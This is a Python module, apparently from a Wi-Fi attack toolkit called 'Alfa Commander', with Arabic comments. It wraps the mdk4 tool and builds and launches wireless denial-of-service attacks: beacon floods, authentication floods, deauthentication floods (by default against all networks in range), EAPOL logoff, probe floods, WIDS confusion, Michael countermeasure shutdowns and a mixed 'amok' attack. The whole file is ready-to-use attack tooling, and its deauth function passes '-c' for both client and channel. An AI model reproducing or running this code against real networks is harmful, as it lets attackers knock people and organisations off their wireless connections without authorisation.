# ============================================================
# Alfa Commander - mdk4 Wrapper
# هجمات الحزم المتقدمة
# ============================================================

from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

from app.utils.shell import StreamingProcess, CommandResult, run, command_exists
from app.utils.validators import normalize_mac
from app.logger import get_logger

logger = get_logger()


# ------------------------------------------------------------
# أوضاع mdk4
# ------------------------------------------------------------
class MDK4Mode:
    BEACON = "b"            # Beacon Flood
    DEAUTH = "d"            # Deauthentication / Disassociation
    AUTH = "a"              # Authentication DoS
    PROBE = "p"             # Probe Request Flood
    EAPOL = "e"             # EAPOL Logoff
    WIDS = "w"              # WIDS Confusion
    MICHAEL = "m"           # Michael Countermeasures
    AMOK = "x"              # Amok (mixed attack)
    SSID_LIST = "s"         # SSID List Flood
    BLACKLIST = "k"         # Blacklist


@dataclass
class BeaconFloodOptions:
    interface: str
    ssid_list_file: Optional[Path] = None
    ssid_random: bool = False
    count: int = 0
    channel: Optional[int] = None
    wpa: bool = False
    wep: bool = False
    # إذا لم يُحدد ssid_list ولا ssid_random، نستخدم SSID واحد أو قائمة مدمجة
    custom_ssids: list[str] = field(default_factory=list)
    mac_random: bool = True


@dataclass
class AuthFloodOptions:
    interface: str
    bssid: str
    client: Optional[str] = None
    count: int = 0
    mac_random: bool = True


@dataclass
class DeauthFloodOptions:
    interface: str
    bssid: Optional[str] = None
    client: Optional[str] = None
    count: int = 0
    channel: Optional[int] = None
    reason: int = 7
    use_blacklist: bool = False


# ------------------------------------------------------------
# الغلاف
# ------------------------------------------------------------
class MDK4:
    BINARY = "mdk4"

    @staticmethod
    def is_available() -> bool:
        return command_exists(MDK4.BINARY)

    # ---------- بناء الأوامر ----------
    @staticmethod
    def build_command(mode: str, interface: str, extra: list[str]) -> list[str]:
        return [MDK4.BINARY, interface, mode] + extra

    # ---------- Beacon Flood ----------
    @staticmethod
    def beacon_flood(opts: BeaconFloodOptions) -> StreamingProcess:
        extra = ["-c", str(opts.channel) if opts.channel else "1-11"]
        if opts.count:
            extra.extend(["-n", str(opts.count)])
        if opts.ssid_list_file:
            extra.extend(["-f", str(opts.ssid_list_file)])
        if opts.ssid_random:
            extra.append("-r")
        if opts.wpa:
            extra.append("-w")
        if opts.wep:
            extra.append("-W")
        if opts.mac_random:
            extra.append("-m")
        # SSIDs مخصصة
        for ssid in opts.custom_ssids:
            extra.extend(["-n", ssid])

        args = MDK4.build_command(MDK4Mode.BEACON, opts.interface, extra)
        logger.info(f"Beacon Flood على {opts.interface} القناة {opts.channel or '1-11'}")
        return StreamingProcess(args)

    # ---------- Auth Flood ----------
    @staticmethod
    def auth_flood(opts: AuthFloodOptions) -> StreamingProcess:
        extra = ["-a", normalize_mac(opts.bssid)]
        if opts.client:
            extra.extend(["-c", normalize_mac(opts.client)])
        if opts.mac_random:
            extra.append("-m")
        if opts.count:
            extra.extend(["-n", str(opts.count)])

        args = MDK4.build_command(MDK4Mode.AUTH, opts.interface, extra)
        logger.info(f"Auth Flood على {opts.bssid}")
        return StreamingProcess(args)

    # ---------- Deauth Flood ----------
    @staticmethod
    def deauth_flood(opts: DeauthFloodOptions) -> StreamingProcess:
        extra = []
        if opts.bssid:
            extra.extend(["-B", normalize_mac(opts.bssid)])
        if opts.client:
            extra.extend(["-c", normalize_mac(opts.client)])
        if opts.channel:
            extra.extend(["-c", str(opts.channel)])
        if opts.count:
            extra.extend(["-n", str(opts.count)])

        args = MDK4.build_command(MDK4Mode.DEAUTH, opts.interface, extra)
        logger.info(f"Deauth Flood على {opts.bssid or 'كل الشبكات'}")
        return StreamingProcess(args)

    # ---------- EAPOL Logoff ----------
    @staticmethod
    def eapol_logoff(interface: str, bssid: str, client: Optional[str] = None) -> StreamingProcess:
        extra = ["-a", normalize_mac(bssid)]
        if client:
            extra.extend(["-c", normalize_mac(client)])
        args = MDK4.build_command(MDK4Mode.EAPOL, interface, extra)
        return StreamingProcess(args)

    # ---------- Probe Flood ----------
    @staticmethod
    def probe_flood(interface: str, ssid_list_file: Optional[Path] = None) -> StreamingProcess:
        extra = []
        if ssid_list_file:
            extra.extend(["-f", str(ssid_list_file)])
        args = MDK4.build_command(MDK4Mode.PROBE, interface, extra)
        return StreamingProcess(args)

    # ---------- WIDS Confusion ----------
    @staticmethod
    def wids_confusion(interface: str, bssid: str, count: int = 0) -> StreamingProcess:
        extra = ["-a", normalize_mac(bssid)]
        if count:
            extra.extend(["-n", str(count)])
        args = MDK4.build_command(MDK4Mode.WIDS, interface, extra)
        return StreamingProcess(args)

    # ---------- Michael Shutdown ----------
    @staticmethod
    def michael_shutdown(interface: str, bssid: str) -> StreamingProcess:
        extra = ["-a", normalize_mac(bssid)]
        args = MDK4.build_command(MDK4Mode.MICHAEL, interface, extra)
        return StreamingProcess(args)

    # ---------- Amok (هجوم متعدد) ----------
    @staticmethod
    def amok(interface: str, channel: int = 1) -> StreamingProcess:
        extra = [str(channel)]
        args = MDK4.build_command(MDK4Mode.AMOK, interface, extra)
        return StreamingProcess(args)


# ------------------------------------------------------------
# دوال مختصرة
# ------------------------------------------------------------
async def start_beacon_flood(
    interface: str,
    channel: Optional[int] = None,
    ssid_random: bool = True,
    wpa: bool = True,
) -> StreamingProcess:
    opts = BeaconFloodOptions(
        interface=interface,
        channel=channel,
        ssid_random=ssid_random,
        wpa=wpa,
    )
    proc = MDK4.beacon_flood(opts)
    await proc.start()
    return proc


async def start_auth_flood(interface: str, bssid: str) -> StreamingProcess:
    opts = AuthFloodOptions(interface=interface, bssid=bssid)
    proc = MDK4.auth_flood(opts)
    await proc.start()
    return proc


# ------------------------------------------------------------
# Module-level shortcuts
# ------------------------------------------------------------
def build_command(mode: str, interface: str, extra: list):
    return MDK4.build_command(mode, interface, extra)


def beacon_flood(opts):
    return MDK4.beacon_flood(opts)


def auth_flood(opts):
    return MDK4.auth_flood(opts)


def deauth_flood(opts):
    return MDK4.deauth_flood(opts)


def eapol_logoff(interface: str, bssid: str, client=None):
    return MDK4.eapol_logoff(interface, bssid, client)


def probe_flood(interface: str, ssid_list_file=None):
    return MDK4.probe_flood(interface, ssid_list_file)


def wids_confusion(interface: str, bssid: str, count: int = 0):
    return MDK4.wids_confusion(interface, bssid, count)


def michael_shutdown(interface: str, bssid: str):
    return MDK4.michael_shutdown(interface, bssid)


def amok(interface: str, channel: int = 1):
    return MDK4.amok(interface, channel)

